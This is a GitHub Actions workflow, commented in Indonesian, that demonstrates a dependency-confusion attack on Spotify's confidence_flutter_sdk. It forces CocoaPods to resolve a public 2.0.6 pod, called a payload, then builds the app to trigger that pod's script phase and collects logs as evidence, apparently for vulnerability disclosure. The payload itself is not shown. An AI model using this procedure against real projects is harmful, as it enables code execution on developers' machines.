name: Supply Chain RCE Proof of Concept (Implicit Resolution)
on: [push, workflow_dispatch]

jobs:
  poc:
    runs-on: macos-latest
    steps:
      - name: Setup Flutter
        uses: subosito/flutter-action@v2
        with:
          channel: 'stable'

      - name: Execute Silent Hijack (No-Mod Version)
        run: |
          # 1. INITIALIZATION
          # Membangun environment bersih layaknya mesin developer baru
          rm -rf rce_test
          flutter create rce_test
          cd rce_test
          
          # 2. FOLLOW OFFICIAL DOCUMENTATION
          # Menjalankan perintah sesuai README resmi Spotify
          echo "=== Adding SDK via Official Instructions ==="
          flutter pub add confidence_flutter_sdk:0.2.1
          
          # 3. THE SEMVER EXPLOIT (The "No-BS" Strategy)
          # Kita TIDAK menghapus flutter_install_all_ios_pods. 
          # Kita hanya menjalankan 'pod update' yang merupakan standar workflow developer.
          # Karena Spotify tidak melakukan version pinning di Podfile mereka, 
          # CocoaPods akan memprioritaskan versi publik (2.0.6) di atas versi lokal (0.2.1).
          
          cd ios
          echo "=== Purging Cache for Deterministic Results ==="
          pod cache clean --all
          rm -rf Pods Podfile.lock
          
          echo "=== Triggering Dependency Resolution ==="
          # pod update akan mencari versi terbaru secara global untuk namespace ini
          pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
          
          echo "=== Verify Shadowing Success ==="
          # Cek apakah Podfile.lock sekarang mengunci ke versi 2.0.6 (Payload Lu)
          grep -A 1 "confidence_flutter_sdk" Podfile.lock
          
          cd ..
          # 4. EXECUTION PHASE
          # Build akan memicu script_phase dari podspec v2.0.6 sebelum kompilasi dimulai
          echo "=== Launching Build to Trigger Payload ==="
          flutter build ios --no-codesign 2>&1 | tee build.log || true
          
          echo "=== Verification: Search for Payload Execution in Logs ==="
          grep -C 5 "Supply Chain Audit" build.log || echo "CRITICAL: Payload signature not found"

      - name: Upload Evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rce-evidence-no-mod
          path: |
            rce_test/ios/pod_update.log
            rce_test/ios/Podfile.lock
            rce_test/build.log
